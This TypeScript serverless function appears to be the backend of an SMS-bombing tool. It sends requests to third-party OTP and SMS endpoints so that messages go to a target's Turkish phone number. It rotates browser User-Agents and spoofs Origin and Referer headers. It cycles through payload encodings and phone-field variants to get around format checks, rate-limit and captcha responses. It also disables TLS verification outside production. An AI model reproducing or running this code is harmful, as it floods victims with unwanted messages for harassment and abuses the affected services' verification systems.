import type { VercelRequest, VercelResponse } from '@vercel/node';

if (process.env.VERCEL_ENV !== 'production') {
  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
];

const PHONE_FIELDS = ['phone', 'mobilePhone', 'phoneNumber', 'mobilePhoneNumber', 'gsm', 'telephone', 'cellPhone'];

function pick<T>(arr: T[]): T { return arr[Math.floor(Math.random() * arr.length)]; }

function buildHeaders(origin?: string): Record<string, string> {
  const h: Record<string, string> = {
    'User-Agent': pick(USER_AGENTS),
    Accept: 'application/json, text/plain, */*',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Content-Type': 'application/json',
    'Cache-Control': 'no-cache',
    DNT: '1',
  };
  if (origin) { h.Origin = origin; h.Referer = origin + '/'; }
  return h;
}

function interpolatePhone(schema: any, phone: string, email?: string): any {
  let str = JSON.stringify(schema);
  str = str.replace(/905XXXXXXXXX/g, `90${phone}`);
  str = str.replace(/05XXXXXXXXX/g, `0${phone}`);
  str = str.replace(/5XXXXXXXXX/g, phone);
  str = str.replace(/\+905XXXXXXXXX/g, `+90${phone}`);
  str = str.replace(/\{\{PHONE\}\}/g, phone);
  str = str.replace(/\{\{EMAIL\}\}/g, email || 'test@test.com');
  return JSON.parse(str);
}

function isHtml(data: any): boolean {
  if (typeof data !== 'string') return false;
  const t = data.trimStart().toLowerCase();
  return t.startsWith('<!doctype') || t.startsWith('<html');
}

function isGenuineSuccess(data: any): boolean {
  if (data === null || data === undefined) return true;
  const str = JSON.stringify(data).toLowerCase();
  const hardFail = [
    '"issuccessful":false', '"smsrequired":false', '"success":false', '"iserror":true',
    'otomatik erisim', 'yeni sürüm gerekli', 'yeni surum gerekli',
    'ust üste cok fazla istek', 'cok fazla istek', 'lutfen 1 dakika',
    'gecersiz istek imzasi', 'geçersiz istek imzası', 'captcha',
  ];
  if (hardFail.some(p => str.includes(p))) return false;
  const hardSuccess = [
    '"responsetype":"success"', 'sms gönderildi', 'sms gonderildi', 'claimid',
    '"processstatus":"success"', '"successful":true',
  ];
  if (hardSuccess.some(p => str.includes(p))) return true;
  return true;
}

async function tryFetch(url: string, method: string, payload: any, headers: any, timeout = 10000): Promise<{ ok: boolean; status: number; data: any; raw: string }> {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), timeout);
    const resp = await fetch(url, {
      method,
      headers,
      body: method !== 'GET' ? JSON.stringify(payload) : undefined,
      signal: ctrl.signal,
    });
    clearTimeout(timer);
    const text = await resp.text();
    let data: any;
    try { data = JSON.parse(text); } catch { data = text; }
    const is200 = resp.status >= 200 && resp.status < 300;
    const html = is200 && isHtml(data);
    const success = is200 && !html && isGenuineSuccess(data);
    return { ok: success, status: resp.status, data, raw: text };
  } catch (e: any) {
    return { ok: false, status: 0, data: e.message || 'fetch error', raw: '' };
  }
}

async function attemptStrategies(opts: {
  serviceUrl: string; serviceMethod: string; targetPhone: string;
  email: string; payloadToUse: any; customHeaders?: Record<string, string>;
  fastFail?: boolean;
}): Promise<any[]> {
  const results: any[] = [];
  const origin = new URL(opts.serviceUrl).origin;
  const headers = { ...buildHeaders(origin), ...(opts.customHeaders || {}) };

  // Strategy 1: Direct with correct payload
  const r1 = await tryFetch(opts.serviceUrl, opts.serviceMethod, opts.payloadToUse, headers);
  results.push({ attempt: 1, strategy: 'direct', ...r1 });
  if (r1.ok || opts.fastFail) return results;

  // Strategy 2: form-urlencoded
  const formHeaders = { ...headers, 'Content-Type': 'application/x-www-form-urlencoded' };
  let encoded: string;
  try { encoded = new URLSearchParams(opts.payloadToUse).toString(); } catch { encoded = JSON.stringify(opts.payloadToUse); }
  const r2 = await tryFetch(opts.serviceUrl, opts.serviceMethod, encoded, formHeaders);
  results.push({ attempt: 2, strategy: 'form_urlencoded', ...r2 });
  if (r2.ok) return results;

  // Strategy 3: bare phone
  const r3 = await tryFetch(opts.serviceUrl, opts.serviceMethod, { phone: opts.targetPhone }, headers);
  results.push({ attempt: 3, strategy: 'bare_phone', ...r3 });
  if (r3.ok) return results;

  // Strategy 4: 90 prefix
  const r4 = await tryFetch(opts.serviceUrl, opts.serviceMethod, { phone: `90${opts.targetPhone}` }, headers);
  results.push({ attempt: 4, strategy: '90_format', ...r4 });
  if (r4.ok) return results;

  // Strategy 5: Smart phone field variants (fast - no delay)
  const phoneFormats = [opts.targetPhone, `0${opts.targetPhone}`, `90${opts.targetPhone}`, `+90${opts.targetPhone}`];
  for (const field of PHONE_FIELDS.slice(0, 6)) {
    for (const fmt of phoneFormats) {
      const payload: any = {};
      for (const k of Object.keys(opts.payloadToUse)) {
        if (k !== 'phone' && k !== 'mobilePhone' && k !== 'phoneNumber' && k !== 'mobilePhoneNumber' && k !== 'gsm' && k !== 'telephone') {
          payload[k] = opts.payloadToUse[k];
        }
      }
      payload[field] = fmt;
      const r = await tryFetch(opts.serviceUrl, opts.serviceMethod, payload, headers);
      results.push({ attempt: results.length + 1, strategy: `variant_${field}_${fmt.substring(0, 5)}`, ...r });
      if (r.ok) return results;
    }
  }

  return results;
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

  const { serviceId, serviceUrl, serviceMethod, serviceHeaders, targetPhone, email, initialPayload, fastFail } = req.body;

  if (!serviceId || !serviceUrl || !targetPhone) {
    return res.status(400).json({ ok: false, error: 'Missing required fields' });
  }

  try {
    let payloadToUse = initialPayload
      ? typeof initialPayload === 'string' ? JSON.parse(initialPayload) : initialPayload
      : { phone: targetPhone };
    payloadToUse = interpolatePhone(payloadToUse, targetPhone, email);

    const attempts = await attemptStrategies({
      serviceUrl,
      serviceMethod: serviceMethod || 'POST',
      targetPhone,
      email: email || '',
      payloadToUse,
      customHeaders: serviceHeaders,
      fastFail: fastFail || false,
    });

    const successAttempt = attempts.find(a => a.ok);
    if (successAttempt) {
      return res.status(200).json({
        ok: true,
        upstreamStatus: successAttempt.status,
        attempt: successAttempt.attempt,
        strategy: successAttempt.strategy,
        lastResponse: typeof successAttempt.raw === 'string' ? successAttempt.raw.substring(0, 500) : JSON.stringify(successAttempt.data).substring(0, 500),
      });
    }

    const last = attempts[attempts.length - 1] || { strategy: 'none', status: 0, data: 'No attempts' };
    return res.status(200).json({
      ok: false,
      upstreamStatus: last.status || 0,
      strategy: last.strategy || 'none',
      error: 'All strategies failed',
      lastResponse: typeof last.data === 'string' ? last.data.substring(0, 300) : JSON.stringify(last.data).substring(0, 300),
    });
  } catch (error: any) {
    return res.status(200).json({ ok: false, upstreamStatus: 0, strategy: 'error', error: error.message });
  }
}
